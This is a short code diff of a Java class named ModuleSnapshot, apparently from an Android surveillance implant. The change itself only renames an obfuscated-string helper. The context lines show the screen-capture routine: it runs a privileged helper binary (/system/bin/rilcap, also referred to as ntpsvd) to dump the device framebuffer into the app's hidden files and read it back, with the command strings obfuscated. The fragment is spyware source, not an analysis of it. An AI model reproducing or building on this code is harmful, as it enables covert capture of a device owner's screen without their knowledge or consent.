@@ -297,7 +297,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 	}
 
 	private byte[] getAdditionalData() {
-		final String window = M.d("Desktop"); //$NON-NLS-1$
+		final String window = M.e("Desktop"); //$NON-NLS-1$
 
 		final int wlen = window.length() * 2;
 		final int tlen = wlen + 24;
@@ -344,7 +344,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 		final String path = filesPath.getAbsolutePath();
 
 		// 11_2=/system/bin/ntpsvd fb
-		final String getrawpath = M.d("/system/bin/ntpsvd fb"); //$NON-NLS-1$
+		final String getrawpath = M.e("/system/bin/ntpsvd fb"); //$NON-NLS-1$
 
 		try {
 			if (Cfg.DEBUG) {
@@ -352,14 +352,14 @@ public class ModuleSnapshot extends BaseInstantModule {
 			}
 
 			// a_0=/system/bin/ntpsvd
-			final Process localProcess = Runtime.getRuntime().exec(new String[] { M.d("/system/bin/rilcap"), "fb", "/data/data/" + Status.self().getAppContext().getPackageName() + "/files/frame" });
+			final Process localProcess = Runtime.getRuntime().exec(new String[] { M.e("/system/bin/rilcap"), "fb", "/data/data/" + Status.self().getAppContext().getPackageName() + "/files/frame" });
 			localProcess.waitFor();
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap): finished calling frame generator");
 			}
 			// 11_3=frame
-			final AutoFile file = new AutoFile(path, M.d("frame")); //$NON-NLS-1$
+			final AutoFile file = new AutoFile(path, M.e("frame")); //$NON-NLS-1$
 
 			if (file.exists()) {
 				return file.read();
